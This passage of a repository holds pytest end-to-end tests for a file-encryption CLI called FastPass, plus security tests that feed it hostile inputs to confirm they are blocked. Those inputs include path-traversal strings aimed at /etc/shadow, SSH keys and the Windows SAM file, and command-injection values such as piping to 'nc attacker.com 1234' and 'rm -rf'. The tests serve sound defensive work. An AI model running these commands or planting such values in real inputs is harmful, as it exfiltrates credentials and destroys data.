# End-to-end tests package
</file>

<file path="tests/e2e/test_complete_workflows.py">
"""
Comprehensive End-to-End Tests for Complete FastPass Workflows
Tests full CLI execution scenarios with real files and operations
"""

import pytest
import subprocess
import shutil
from pathlib import Path
import tempfile
import json

# Import test utilities
from tests.conftest import run_fastpass_command


class TestBasicEncryptDecryptWorkflows:
    """Test basic encrypt and decrypt workflows"""
    
    @pytest.mark.e2e
    def test_encrypt_single_pdf_file(self, fastpass_executable, sample_pdf_file, project_root):
        """Test: Encrypt single PDF file with password"""
        if not sample_pdf_file:
            pytest.skip("Sample PDF not available")
        
        # Get original file size
        original_size = sample_pdf_file.stat().st_size
        
        # Encrypt the file
        result = run_fastpass_command(
            fastpass_executable,
            ["encrypt", "-i", str(sample_pdf_file), "-p", "test_password_123"],
            cwd=project_root
        )
        
        assert result.returncode == 0, f"Encryption failed: {result.stderr}"
        assert "Successfully encrypted" in result.stdout
        assert sample_pdf_file.exists()
        
        # File size should have changed (encrypted files often different size)
        # We don't check exact size as it depends on encryption implementation
    
    @pytest.mark.e2e
    def test_decrypt_single_pdf_file(self, fastpass_executable, encrypted_test_files, project_root):
        """Test: Decrypt single PDF file with correct password"""
        if not encrypted_test_files or "pdf" not in encrypted_test_files:
            pytest.skip("Encrypted test files not available")
        
        encrypted_file = encrypted_test_files["pdf"]["file"]
        password = encrypted_test_files["pdf"]["password"]
        
        # Decrypt the file
        result = run_fastpass_command(
            fastpass_executable,
            ["decrypt", "-i", str(encrypted_file), "-p", password],
            cwd=project_root
        )
        
        assert result.returncode == 0, f"Decryption failed: {result.stderr}"
        assert "Successfully decrypted" in result.stdout
        assert encrypted_file.exists()
    
    @pytest.mark.e2e
    def test_encrypt_decrypt_cycle_preserves_content(self, fastpass_executable, sample_pdf_file, project_root):
        """Test: Complete encrypt→decrypt cycle preserves file content"""
        if not sample_pdf_file:
            pytest.skip("Sample PDF not available")
        
        # Get original content hash
        original_content = sample_pdf_file.read_bytes()
        
        # Step 1: Encrypt
        encrypt_result = run_fastpass_command(
            fastpass_executable,
            ["encrypt", "-i", str(sample_pdf_file), "-p", "cycle_test_password"],
            cwd=project_root
        )
        assert encrypt_result.returncode == 0
        
        # Step 2: Decrypt
        decrypt_result = run_fastpass_command(
            fastpass_executable,
            ["decrypt", "-i", str(sample_pdf_file), "-p", "cycle_test_password"],
            cwd=project_root
        )
        assert decrypt_result.returncode == 0
        
        # Verify content is preserved
        final_content = sample_pdf_file.read_bytes()
        assert final_content == original_content, "File content not preserved through encrypt/decrypt cycle"
    
    @pytest.mark.e2e
    def test_check_password_encrypted_file(self, fastpass_executable, encrypted_test_files, project_root):
        """Test: Check password on encrypted file"""
        if not encrypted_test_files or "pdf" not in encrypted_test_files:
            pytest.skip("Encrypted test files not available")
        
        encrypted_file = encrypted_test_files["pdf"]["file"]
        password = encrypted_test_files["pdf"]["password"]
        
        # Check correct password
        result = run_fastpass_command(
            fastpass_executable,
            ["check-password", "-i", str(encrypted_file), "-p", password],
            cwd=project_root
        )
        
        assert result.returncode == 0, f"Password check failed: {result.stderr}"
        assert "Password verification successful" in result.stdout or "Success" in result.stdout
    
    @pytest.mark.e2e
    def test_check_password_unencrypted_file(self, fastpass_executable, sample_pdf_file, project_root):
        """Test: Check password on unencrypted file"""
        if not sample_pdf_file:
            pytest.skip("Sample PDF not available")
        
        # Check password on unencrypted file (should succeed without password)
        result = run_fastpass_command(
            fastpass_executable,
            ["check-password", "-i", str(sample_pdf_file)],
            cwd=project_root
        )
        
        assert result.returncode == 0, f"Password check failed: {result.stderr}"


class TestMultipleFileWorkflows:
    """Test workflows with multiple files"""
    
    @pytest.mark.e2e
    def test_encrypt_multiple_files_same_password(self, fastpass_executable, multiple_test_files, project_root):
        """Test: Encrypt multiple files with same password"""
        if not multiple_test_files or len(multiple_test_files) < 2:
            pytest.skip("Multiple test files not available")
        
        file_paths = [str(f) for f in multiple_test_files]
        
        # Encrypt all files with same password
        result = run_fastpass_command(
            fastpass_executable,
            ["encrypt", "-i"] + file_paths + ["-p", "shared_password_123"],
            cwd=project_root
        )
        
        assert result.returncode == 0, f"Multi-file encryption failed: {result.stderr}"
        assert f"Total files processed: {len(file_paths)}" in result.stdout
        assert f"Successful: {len(file_paths)}" in result.stdout
        assert "Failed: 0" in result.stdout
    
    @pytest.mark.e2e
    def test_decrypt_multiple_files_same_password(self, fastpass_executable, temp_work_dir, sample_pdf_file, project_root):
        """Test: Decrypt multiple files with same password"""
        if not sample_pdf_file:
            pytest.skip("Sample PDF not available")
        
        # Create multiple files by copying the sample
        test_files = []
        for i in range(3):
            test_file = temp_work_dir / f"multi_test_{i}.pdf"
            shutil.copy2(sample_pdf_file, test_file)
            test_files.append(test_file)
        
        # First encrypt all files
        file_paths = [str(f) for f in test_files]
        encrypt_result = run_fastpass_command(
            fastpass_executable,
            ["encrypt", "-i"] + file_paths + ["-p", "multi_password"],
            cwd=project_root
        )
        assert encrypt_result.returncode == 0
        
        # Then decrypt all files
        decrypt_result = run_fastpass_command(
            fastpass_executable,
            ["decrypt", "-i"] + file_paths + ["-p", "multi_password"],
            cwd=project_root
        )
        
        assert decrypt_result.returncode == 0, f"Multi-file decryption failed: {decrypt_result.stderr}"
        assert f"Total files processed: {len(file_paths)}" in decrypt_result.stdout
        assert f"Successful: {len(file_paths)}" in decrypt_result.stdout
    
    @pytest.mark.e2e
    def test_mixed_encrypted_unencrypted_batch(self, fastpass_executable, temp_work_dir, sample_pdf_file, project_root):
        """Test: Process batch with mix of encrypted and unencrypted files"""
        if not sample_pdf_file:
            pytest.skip("Sample PDF not available")
        
        # Create test files
        encrypted_file = temp_work_dir / "encrypted.pdf"
        unencrypted_file = temp_work_dir / "unencrypted.pdf"
        
        shutil.copy2(sample_pdf_file, encrypted_file)
        shutil.copy2(sample_pdf_file, unencrypted_file)
        
        # Encrypt one file
        encrypt_result = run_fastpass_command(
            fastpass_executable,
            ["encrypt", "-i", str(encrypted_file), "-p", "batch_password"],
            cwd=project_root
        )
        assert encrypt_result.returncode == 0
        
        # Now check passwords on both files
        check_result = run_fastpass_command(
            fastpass_executable,
            ["check-password", "-i", str(encrypted_file), str(unencrypted_file)],
            cwd=project_root
        )
        
        assert check_result.returncode == 0, f"Mixed batch check failed: {check_result.stderr}"


class TestPasswordListWorkflows:
    """Test workflows using password list files"""
    
    @pytest.mark.e2e
    def test_decrypt_with_password_list_file(self, fastpass_executable, temp_work_dir, sample_pdf_file, password_list_file, project_root):
        """Test: Decrypt file using password list file"""
        if not sample_pdf_file:
            pytest.skip("Sample PDF not available")
        
        # Create and encrypt a test file with a password from the list
        test_file = temp_work_dir / "password_list_test.pdf"
        shutil.copy2(sample_pdf_file, test_file)
        
        # Encrypt with password that's in the list (password123 is first in list)
        encrypt_result = run_fastpass_command(
            fastpass_executable,
            ["encrypt", "-i", str(test_file), "-p", "password123"],
            cwd=project_root
        )
        assert encrypt_result.returncode == 0
        
        # Decrypt using password list
        decrypt_result = run_fastpass_command(
            fastpass_executable,
            ["decrypt", "-i", str(test_file), "--password-list", str(password_list_file)],
            cwd=project_root
        )
        
        assert decrypt_result.returncode == 0, f"Password list decryption failed: {decrypt_result.stderr}"
        assert "Successfully decrypted" in decrypt_result.stdout
    
    @pytest.mark.e2e
    def test_password_list_priority_order(self, fastpass_executable, temp_work_dir, sample_pdf_file, password_list_file, project_root):
        """Test: Password list tries passwords in correct order"""
        if not sample_pdf_file:
            pytest.skip("Sample PDF not available")
        
        # Create test file encrypted with a password that's NOT first in the list
        test_file = temp_work_dir / "priority_test.pdf"
        shutil.copy2(sample_pdf_file, test_file)
        
        # Encrypt with "secret456" which should be second in the password list
        encrypt_result = run_fastpass_command(
            fastpass_executable,
            ["encrypt", "-i", str(test_file), "-p", "secret456"],
            cwd=project_root
        )
        assert encrypt_result.returncode == 0
        
        # Decrypt using password list (should try passwords in order)
        decrypt_result = run_fastpass_command(
            fastpass_executable,
            ["decrypt", "-i", str(test_file), "--password-list", str(password_list_file)],
            cwd=project_root
        )
        
        assert decrypt_result.returncode == 0, f"Priority order test failed: {decrypt_result.stderr}"
        # The output should indicate that it found the correct password
        assert "Successfully decrypted" in decrypt_result.stdout
    
    @pytest.mark.e2e
    def test_password_list_exhaustion(self, fastpass_executable, temp_work_dir, sample_pdf_file, password_list_file, project_root):
        """Test: Behavior when password list is exhausted"""
        if not sample_pdf_file:
            pytest.skip("Sample PDF not available")
        
        # Create test file encrypted with password NOT in the list
        test_file = temp_work_dir / "exhaustion_test.pdf"
        shutil.copy2(sample_pdf_file, test_file)
        
        # Encrypt with password not in password list
        encrypt_result = run_fastpass_command(
            fastpass_executable,
            ["encrypt", "-i", str(test_file), "-p", "password_not_in_list"],
            cwd=project_root
        )
        assert encrypt_result.returncode == 0
        
        # Try to decrypt using password list (should fail)
        decrypt_result = run_fastpass_command(
            fastpass_executable,
            ["decrypt", "-i", str(test_file), "--password-list", str(password_list_file)],
            cwd=project_root
        )
        
        # Should fail gracefully
        assert decrypt_result.returncode != 0
        assert "Failed: 1" in decrypt_result.stdout or "password" in decrypt_result.stderr.lower()


class TestOutputDirectoryWorkflows:
    """Test workflows with output directories"""
    
    @pytest.mark.e2e
    def test_encrypt_with_output_directory(self, fastpass_executable, sample_pdf_file, temp_work_dir, project_root):
        """Test: Encrypt file to output directory"""
        if not sample_pdf_file:
            pytest.skip("Sample PDF not available")
        
        output_dir = temp_work_dir / "output"
        
        # Encrypt with output directory
        result = run_fastpass_command(
            fastpass_executable,
            ["encrypt", "-i", str(sample_pdf_file), "-p", "output_test_password", "-o", str(output_dir)],
            cwd=project_root
        )
        
        assert result.returncode == 0, f"Output directory encryption failed: {result.stderr}"
        
        # Verify output directory was created
        assert output_dir.exists()
        assert output_dir.is_dir()
        
        # Verify file was created in output directory
        output_file = output_dir / sample_pdf_file.name
        assert output_file.exists()
        
        # Original file should still exist
        assert sample_pdf_file.exists()
    
    @pytest.mark.e2e
    def test_decrypt_with_output_directory(self, fastpass_executable, temp_work_dir, sample_pdf_file, project_root):
        """Test: Decrypt file to output directory"""
        if not sample_pdf_file:
            pytest.skip("Sample PDF not available")
        
        # First create an encrypted file
        encrypted_file = temp_work_dir / "to_decrypt.pdf"
        shutil.copy2(sample_pdf_file, encrypted_file)
        
        encrypt_result = run_fastpass_command(
            fastpass_executable,
            ["encrypt", "-i", str(encrypted_file), "-p", "decrypt_output_test"],
            cwd=project_root
        )
        assert encrypt_result.returncode == 0
        
        # Now decrypt to output directory
        output_dir = temp_work_dir / "decrypted_output"
        
        decrypt_result = run_fastpass_command(
            fastpass_executable,
            ["decrypt", "-i", str(encrypted_file), "-p", "decrypt_output_test", "-o", str(output_dir)],
            cwd=project_root
        )
        
        assert decrypt_result.returncode == 0, f"Output directory decryption failed: {decrypt_result.stderr}"
        
        # Verify output
        assert output_dir.exists()
        output_file = output_dir / encrypted_file.name
        assert output_file.exists()


class TestSpecialFlagWorkflows:
    """Test workflows with special flags"""
    
    @pytest.mark.e2e 
    def test_dry_run_mode(self, fastpass_executable, sample_pdf_file, project_root):
        """Test: Dry run mode shows operations without executing"""
        if not sample_pdf_file:
            pytest.skip("Sample PDF not available")
        
        # Get original content
        original_content = sample_pdf_file.read_bytes()
        
        # Run in dry-run mode
        result = run_fastpass_command(
            fastpass_executable,
            ["encrypt", "-i", str(sample_pdf_file), "-p", "dry_run_password", "--dry-run"],
            cwd=project_root
        )
        
        assert result.returncode == 0, f"Dry run failed: {result.stderr}"
        assert "DRY RUN" in result.stdout or "would encrypt" in result.stdout.lower()
        
        # File should be unchanged
        final_content = sample_pdf_file.read_bytes()
        assert final_content == original_content, "Dry run mode modified the file"
    
    @pytest.mark.e2e
    def test_verify_mode(self, fastpass_executable, sample_pdf_file, project_root):
        """Test: Verify mode performs deep verification"""
        if not sample_pdf_file:
            pytest.skip("Sample PDF not available")
        
        # Encrypt with verify mode
        result = run_fastpass_command(
            fastpass_executable,
            ["encrypt", "-i", str(sample_pdf_file), "-p", "verify_test_password", "--verify"],
            cwd=project_root
        )
        
        assert result.returncode == 0, f"Verify mode encryption failed: {result.stderr}"
        # Should include verification information in output
        assert "verify" in result.stdout.lower() or "verification" in result.stdout.lower()
    
    @pytest.mark.e2e
    def test_debug_mode(self, fastpass_executable, sample_pdf_file, project_root):
        """Test: Debug mode provides detailed logging"""
        if not sample_pdf_file:
            pytest.skip("Sample PDF not available")
        
        # Run with debug mode
        result = run_fastpass_command(
            fastpass_executable,
            ["encrypt", "-i", str(sample_pdf_file), "-p", "debug_test_password", "--debug"],
            cwd=project_root
        )
        
        assert result.returncode == 0, f"Debug mode failed: {result.stderr}"
        # Debug mode should produce more verbose output
        assert "[DEBUG]" in result.stdout or len(result.stdout) > 100


class TestErrorRecoveryWorkflows:
    """Test error conditions and recovery"""
    
    @pytest.mark.e2e
    def test_wrong_password_graceful_failure(self, fastpass_executable, encrypted_test_files, project_root):
        """Test: Wrong password fails gracefully"""
        if not encrypted_test_files or "pdf" not in encrypted_test_files:
            pytest.skip("Encrypted test files not available")
        
        encrypted_file = encrypted_test_files["pdf"]["file"]
        
        # Try to decrypt with wrong password
        result = run_fastpass_command(
            fastpass_executable,
            ["decrypt", "-i", str(encrypted_file), "-p", "wrong_password"],
            cwd=project_root
        )
        
        # Should fail with appropriate error message
        assert result.returncode != 0
        assert "password" in result.stderr.lower() or "Failed: 1" in result.stdout
    
    @pytest.mark.e2e
    def test_nonexistent_file_error(self, fastpass_executable, project_root):
        """Test: Non-existent file produces appropriate error"""
        from pathlib import Path
        # Use a nonexistent file within the home directory (which is allowed by security)
        nonexistent_file = str(Path.home() / "nonexistent_test_file_12345.pdf")
        
        result = run_fastpass_command(
            fastpass_executable,
            ["encrypt", "-i", nonexistent_file, "-p", "password"],
            cwd=project_root
        )
        
        assert result.returncode != 0
        assert "not found" in result.stderr.lower() or "does not exist" in result.stderr.lower()
    
    @pytest.mark.e2e
    def test_unsupported_file_format_error(self, fastpass_executable, unsupported_test_files, project_root):
        """Test: Unsupported file format produces appropriate error"""
        if not unsupported_test_files or "txt" not in unsupported_test_files:
            pytest.skip("Unsupported test files not available")
        
        txt_file = unsupported_test_files["txt"]
        
        result = run_fastpass_command(
            fastpass_executable,
            ["encrypt", "-i", str(txt_file), "-p", "password"],
            cwd=project_root
        )
        
        assert result.returncode != 0
        assert "unsupported" in result.stderr.lower() or "format" in result.stderr.lower()
    
    @pytest.mark.e2e
    def test_partial_batch_failure_recovery(self, fastpass_executable, temp_work_dir, sample_pdf_file, unsupported_test_files, project_root):
        """Test: Partial failure in batch processes successfully completed files"""
        if not sample_pdf_file or not unsupported_test_files:
            pytest.skip("Test files not available")
        
        # Create a mix of valid and invalid files
        valid_file = temp_work_dir / "valid.pdf"
        shutil.copy2(sample_pdf_file, valid_file)
        invalid_file = unsupported_test_files.get("txt")
        
        if not invalid_file:
            pytest.skip("Invalid file not available")
        
        # Try to process both files
        result = run_fastpass_command(
            fastpass_executable,
            ["encrypt", "-i", str(valid_file), str(invalid_file), "-p", "batch_password"],
            cwd=project_root
        )
        
        # Should report partial success
        assert "Successful: 1" in result.stdout
        assert "Failed: 1" in result.stdout


class TestInformationCommands:
    """Test information and help commands"""
    
    @pytest.mark.e2e
    def test_list_supported_formats(self, fastpass_executable, project_root):
        """Test: --list-supported shows supported formats"""
        result = run_fastpass_command(
            fastpass_executable,
            ["--list-supported"],
            cwd=project_root
        )
        
        assert result.returncode == 0
        assert "FastPass Supported File Formats:" in result.stdout
        assert ".pdf" in result.stdout
        assert ".docx" in result.stdout
        assert ".xlsx" in result.stdout
        assert ".pptx" in result.stdout
    
    @pytest.mark.e2e
    def test_version_display(self, fastpass_executable, project_root):
        """Test: --version shows version information"""
        result = run_fastpass_command(
            fastpass_executable,
            ["--version"],
            cwd=project_root
        )
        
        assert result.returncode == 0
        assert "FastPass" in result.stdout
        # Should include version number
        assert any(char.isdigit() for char in result.stdout)
    
    @pytest.mark.e2e
    def test_help_display(self, fastpass_executable, project_root):
        """Test: --help shows usage information"""
        result = run_fastpass_command(
            fastpass_executable,
            ["--help"],
            cwd=project_root
        )
        
        assert result.returncode == 0
        assert "usage:" in result.stdout.lower()
        assert "encrypt" in result.stdout
        assert "decrypt" in result.stdout
        assert "check-password" in result.stdout
</file>

<file path="tests/fixtures/__init__.py">
# Test fixtures package
</file>

<file path="tests/integration/__init__.py">
# Integration tests package
</file>

<file path="tests/performance/__init__.py">
# Performance tests package
</file>

<file path="tests/requirements.txt">
# Test dependencies
pytest>=7.0.0
pytest-cov>=4.0.0
</file>

<file path="tests/security/__init__.py">
# Security tests package
</file>

<file path="tests/security/test_attack_simulation.py">
"""
Comprehensive Security Attack Simulation Tests
Tests real security attack scenarios and prevention mechanisms
"""

import pytest
import subprocess
import tempfile
import os
from pathlib import Path
import stat
from unittest.mock import patch

# Import test utilities
from tests.conftest import run_fastpass_command
from src.app import SecurityViolationError


class TestPathTraversalAttacks:
    """Test path traversal attack prevention"""
    
    @pytest.mark.security
    def test_path_traversal_unix_style(self, fastpass_executable, project_root):
        """Test: Unix-style path traversal attacks are blocked"""
        traversal_paths = [
            "../../../etc/passwd",
            "../../../../../../etc/shadow", 
            "../../../root/.ssh/id_rsa",
            "../../../../usr/bin/passwd"
        ]
        
        for path in traversal_paths:
            result = run_fastpass_command(
                fastpass_executable,
                ["encrypt", "-i", path, "-p", "password"],
                cwd=project_root
            )
            
            # Should be blocked with security error
            assert result.returncode != 0, f"Path traversal attack not blocked: {path}"
            assert any(word in result.stderr.lower() for word in ["security", "not found", "invalid", "error"])
    
    @pytest.mark.security
    def test_path_traversal_windows_style(self, fastpass_executable, project_root):
        """Test: Windows-style path traversal attacks are blocked"""
        traversal_paths = [
            "..\\..\\..\\Windows\\System32\\config\\SAM",
            "..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
            "..\\..\\..\\Users\\Administrator\\NTUSER.DAT",
            "..\\..\\Windows\\win.ini"
        ]
        
        for path in traversal_paths:
            result = run_fastpass_command(
                fastpass_executable,
                ["encrypt", "-i", path, "-p", "password"],
                cwd=project_root
            )
            
            # Should be blocked with security error
            assert result.returncode != 0, f"Windows path traversal attack not blocked: {path}"
            assert any(word in result.stderr.lower() for word in ["security", "not found", "invalid", "error"])
    
    @pytest.mark.security
    def test_path_traversal_encoded_attacks(self, fastpass_executable, project_root):
        """Test: URL/percent-encoded path traversal attacks are blocked"""
        encoded_paths = [
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "..%5C..%5C..%5CWindows%5CSystem32%5Cconfig%5CSAM",
            "%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd"
        ]
        
        for path in encoded_paths:
            result = run_fastpass_command(
                fastpass_executable,
                ["encrypt", "-i", path, "-p", "password"],
                cwd=project_root
            )
            
            # Should be blocked
            assert result.returncode != 0, f"Encoded path traversal attack not blocked: {path}"
    
    @pytest.mark.security
    def test_path_traversal_absolute_paths(self, fastpass_executable, project_root):
        """Test: Absolute paths to system files are blocked"""
        absolute_paths = [
            "/etc/passwd",
            "/etc/shadow",
            "/bin/sh",
            "C:\\Windows\\System32\\cmd.exe",
            "C:\\Windows\\System32\\config\\SAM"
        ]
        
        for path in absolute_paths:
            result = run_fastpass_command(
                fastpass_executable,
                ["encrypt", "-i", path, "-p", "password"],
                cwd=project_root
            )
            
            # Should be blocked due to being outside allowed directories
            assert result.returncode != 0, f"Absolute path attack not blocked: {path}"


class TestSymlinkAttacks:
    """Test symbolic link attack prevention"""
    
    @pytest.mark.security
    def test_symlink_to_system_file(self, fastpass_executable, temp_work_dir, project_root):
        """Test: Symlinks to system files are blocked"""
        # Create a symlink pointing to a system file
        symlink_file = temp_work_dir / "innocent_looking.pdf"
        target_file = "/etc/passwd"  # Unix system file
        
        try:
            symlink_file.symlink_to(target_file)
            
            result = run_fastpass_command(
                fastpass_executable,
                ["encrypt", "-i", str(symlink_file), "-p", "password"],
                cwd=project_root
            )
            
            # Should be blocked
            assert result.returncode != 0, "Symlink attack not blocked"
            assert "symlink" in result.stderr.lower() or "security" in result.stderr.lower()
            
        except OSError:
            pytest.skip("Symlinks not supported on this system")
    
    @pytest.mark.security 
    def test_symlink_in_path_chain(self, fastpass_executable, temp_work_dir, project_root):
        """Test: Symlinks in directory path are blocked"""
        # Create real directory and file
        real_dir = temp_work_dir / "real_directory"
        real_dir.mkdir()
        real_file = real_dir / "document.pdf"
        real_file.write_text("fake pdf content")
        
        # Create symlink to directory
        symlink_dir = temp_work_dir / "symlink_directory"
        try:
            symlink_dir.symlink_to(real_dir)
            
            # Try to access file through symlinked directory
            symlink_path = symlink_dir / "document.pdf"
            
            result = run_fastpass_command(
                fastpass_executable,
                ["encrypt", "-i", str(symlink_path), "-p", "password"],
                cwd=project_root
            )
            
            # Should be blocked
            assert result.returncode != 0, "Symlink directory attack not blocked"
            
        except OSError:
            pytest.skip("Symlinks not supported on this system")


class TestCommandInjectionAttacks:
    """Test command injection attack prevention"""
    
    @pytest.mark.security
    def test_filename_command_injection(self, fastpass_executable, temp_work_dir, project_root):
        """Test: Command injection via filename is blocked"""
        malicious_filenames = [
            "file.pdf; rm -rf /tmp/*",
            "file.pdf && cat /etc/passwd",
            "file.pdf | nc attacker.com 1234",
            "file.pdf; powershell.exe -Command 'Get-Process'",
            "file.pdf`whoami`",
            "file.pdf$(whoami)"
        ]
        
        for filename in malicious_filenames:
            result = run_fastpass_command(
                fastpass_executable,
                ["encrypt", "-i", filename, "-p", "password"],
                cwd=project_root
            )
            
            # Should be blocked (either file not found or security violation)
            assert result.returncode != 0, f"Command injection filename not blocked: {filename}"
            # Should not execute the injected command
    
    @pytest.mark.security
    def test_password_command_injection(self, fastpass_executable, temp_work_dir, sample_pdf_file, project_root):
        """Test: Command injection via password is blocked"""
        if not sample_pdf_file:
            pytest.skip("Sample PDF not available")
        
        malicious_passwords = [
            "password; cat /etc/passwd",
            "password && rm file.txt",
            "password | nc attacker.com 1234",
            "password`whoami`",
            "password$(id)"
        ]
        
        for password in malicious_passwords:
            result = run_fastpass_command(
                fastpass_executable,
                ["encrypt", "-i", str(sample_pdf_file), "-p", password],
                cwd=project_root
            )
            
            # FastPass should handle the password safely without executing commands
            # The operation may succeed or fail, but no command should be executed
            # We can't easily verify command execution didn't happen, but the test
            # ensures the password is processed as a string, not executed
            pass  # If we get here without system hanging, the test passes
    
    @pytest.mark.security
    def test_output_directory_command_injection(self, fastpass_executable, sample_pdf_file, project_root):
        """Test: Command injection via output directory is blocked"""
        if not sample_pdf_file:
            pytest.skip("Sample PDF not available")
        
        malicious_paths = [
            "/tmp/output; rm -rf /tmp/*",
            "/tmp/output && whoami",
            "/tmp/output | nc attacker.com 1234"
        ]
        
        for path in malicious_paths:
            result = run_fastpass_command(
                fastpass_executable,
                ["encrypt", "-i", str(sample_pdf_file), "-p", "password", "-o", path],
                cwd=project_root
            )
            
            # Should be blocked or handled safely
            # The semicolon and other shell metacharacters should be treated as literal path components
            assert result.returncode != 0, f"Command injection output path not blocked: {path}"


class TestFileFormatAttacks:
    """Test file format-based attacks"""
    
    @pytest.mark.security
    def test_fake_pdf_extension_attack(self, fastpass_executable, temp_work_dir, project_root):
        """Test: Files with fake PDF extension are detected"""
        # Create a text file with .pdf extension
        fake_pdf = temp_work_dir / "malicious.pdf"
        fake_pdf.write_text("This is actually a text file pretending to be PDF")
        
        result = run_fastpass_command(
            fastpass_executable,
            ["encrypt", "-i", str(fake_pdf), "-p", "password"],
            cwd=project_root
        )
        
        # Should be blocked due to format validation
        assert result.returncode != 0, "Fake PDF extension attack not blocked"
        assert any(word in result.stderr.lower() for word in ["format", "invalid", "unsupported"])
    
    @pytest.mark.security
    def test_zero_byte_file_attack(self, fastpass_executable, temp_work_dir, project_root):
        """Test: Zero-byte files are handled securely"""
        zero_file = temp_work_dir / "zero_bytes.pdf"
        zero_file.touch()  # Create empty file
        
        result = run_fastpass_command(
            fastpass_executable,
            ["encrypt", "-i", str(zero_file), "-p", "password"],
            cwd=project_root
        )
        
        # Should be handled gracefully (may succeed or fail, but shouldn't crash)
        # The important thing is that it doesn't cause a crash or hang
        pass  # Test passes if no crash occurs
    
    @pytest.mark.security
    def test_oversized_filename_attack(self, fastpass_executable, temp_work_dir, project_root):
        """Test: Extremely long filenames are handled securely"""
        # Create file with very long name (approaching filesystem limits)
        long_name = "a" * 250 + ".pdf"
        long_file = temp_work_dir / long_name
        
        try:
            long_file.write_text("test content")
            
            result = run_fastpass_command(
                fastpass_executable,
                ["encrypt", "-i", str(long_file), "-p", "password"],
                cwd=project_root
            )
            
            # Should handle long filenames without crashing
            # May succeed or fail depending on system limits
            pass  # Test passes if no crash occurs
            
        except OSError:
            # If we can't create the file due to system limits, that's fine
            pytest.skip("Cannot create file with long name on this system")


class TestMemoryAttacks:
    """Test memory-based attacks"""
    
    @pytest.mark.security
    def test_extremely_long_password_attack(self, fastpass_executable, sample_pdf_file, project_root):
        """Test: Extremely long passwords don't cause memory issues"""
        if not sample_pdf_file:
            pytest.skip("Sample PDF not available")
        
        # Create a very long password (1MB)
        long_password = "a" * (1024 * 1024)
        
        result = run_fastpass_command(
            fastpass_executable,
            ["encrypt", "-i", str(sample_pdf_file), "-p", long_password],
            cwd=project_root
        )
        
        # Should handle long passwords without memory exhaustion
        # May succeed or fail, but shouldn't hang or crash
        pass  # Test passes if no crash/hang occurs
    
    @pytest.mark.security
    def test_password_memory_exposure(self, fastpass_executable, sample_pdf_file, project_root):
        """Test: Passwords are not exposed in process arguments"""
        if not sample_pdf_file:
            pytest.skip("Sample PDF not available")
        
        # This test is somewhat limited as we can't easily check process list
        # But we can verify that the password handling doesn't expose sensitive data
        test_password = "secret_password_12345"
        
        result = run_fastpass_command(
            fastpass_executable,
            ["encrypt", "-i", str(sample_pdf_file), "-p", test_password],
            cwd=project_root
        )
        
        # The important thing is that passwords are handled internally
        # and not logged or exposed in error messages
        if result.returncode != 0:
            # Check that password is not in error output
            assert test_password not in result.stderr, "Password exposed in error output"
            assert test_password not in result.stdout, "Password exposed in standard output"


class TestResourceExhaustionAttacks:
    """Test resource exhaustion attack prevention"""
    
    @pytest.mark.security
    def test_excessive_file_count_attack(self, fastpass_executable, temp_work_dir, project_root):
        """Test: Excessive number of files doesn't cause resource exhaustion"""
        # Create many small files
        file_count = 100  # Reasonable number for testing
        file_paths = []
        
        for i in range(file_count):
            test_file = temp_work_dir / f"test_{i}.pdf"
            test_file.write_text("small pdf content")
            file_paths.append(str(test_file))
        
        # Try to process all files at once
        result = run_fastpass_command(
            fastpass_executable,
            ["encrypt", "-i"] + file_paths + ["-p", "password"],
            cwd=project_root,
            # Add timeout to prevent hanging
        )
        
        # Should handle many files without exhaustion
        # May succeed or fail, but shouldn't hang indefinitely
        pass  # Test passes if it completes within reasonable time
    
    @pytest.mark.security  
    def test_recursive_directory_depth_attack(self, fastpass_executable, temp_work_dir, project_root):
        """Test: Very deep directory structures are handled safely"""
        # Create deep directory structure
        current_dir = temp_work_dir
        depth = 50  # Reasonable depth for testing
        
        for i in range(depth):
            current_dir = current_dir / f"level_{i}"
            current_dir.mkdir()
        
        # Create a file at the deepest level
        deep_file = current_dir / "deep_file.pdf"
        deep_file.write_text("test content")
        
        result = run_fastpass_command(
            fastpass_executable,
            ["encrypt", "-i", str(deep_file), "-p", "password"],
            cwd=project_root
        )
        
        # Should handle deep paths without issues (may succeed or fail based on path limits)
        pass  # Test passes if no crash occurs


class TestPermissionAttacks:
    """Test permission-based attacks"""
    
    @pytest.mark.security
    @pytest.mark.skipif(os.name == 'nt', reason="Unix permissions not applicable on Windows")
    def test_world_writable_file_attack(self, fastpass_executable, temp_work_dir, project_root):
        """Test: World-writable files are handled securely"""
        # Create world-writable file
        writable_file = temp_work_dir / "world_writable.pdf"
        writable_file.write_text("test content")
        
        try:
            # Make file world-writable (outside temp directory, this would be blocked)
            writable_file.chmod(0o666)
            
            result = run_fastpass_command(
                fastpass_executable,
                ["encrypt", "-i", str(writable_file), "-p", "password"],
                cwd=project_root
            )
            
            # In temp directory, may be allowed. Outside temp, should be blocked.
            # The security validator checks for world-writable files outside temp
            pass
            
        except PermissionError:
            pytest.skip("Cannot modify file permissions on this system")
    
    @pytest.mark.security
    def test_permission_denied_handling(self, fastpass_executable, temp_work_dir, project_root):
        """Test: Permission denied errors are handled gracefully"""
        # Create a file and try to make it unreadable
        protected_file = temp_work_dir / "protected.pdf"
        protected_file.write_text("test content")
        
        try:
            # Make file unreadable
            protected_file.chmod(0o000)
            
            result = run_fastpass_command(
                fastpass_executable,
                ["encrypt", "-i", str(protected_file), "-p", "password"],
                cwd=project_root
            )
            
            # Should fail gracefully with permission error
            assert result.returncode != 0, "Permission denied not handled"
            
        except PermissionError:
            pytest.skip("Cannot modify file permissions on this system")
        finally:
            # Restore permissions for cleanup
            try:
                protected_file.chmod(0o644)
            except:
                pass


class TestInputValidationAttacks:
    """Test input validation attack prevention"""
    
    @pytest.mark.security
    def test_unicode_filename_attack(self, fastpass_executable, temp_work_dir, project_root):
        """Test: Unicode filenames with potential exploits are handled safely"""
        unicode_names = [
            "тест.pdf",  # Cyrillic
            "测试.pdf",   # Chinese
            "🔒file.pdf",  # Emoji
            "file\u202e.pdf",  # Right-to-left override
            "file\u00a0.pdf"   # Non-breaking space
        ]
        
        for name in unicode_names:
            try:
                unicode_file = temp_work_dir / name
                unicode_file.write_text("test content")
                
                result = run_fastpass_command(
                    fastpass_executable,
                    ["encrypt", "-i", str(unicode_file), "-p", "password"],
                    cwd=project_root
                )
                
                # Should handle unicode filenames without issues
                pass  # Test passes if no crash occurs
                
            except (OSError, UnicodeError):
                # Some filesystems may not support certain unicode characters
                continue
    
    @pytest.mark.security
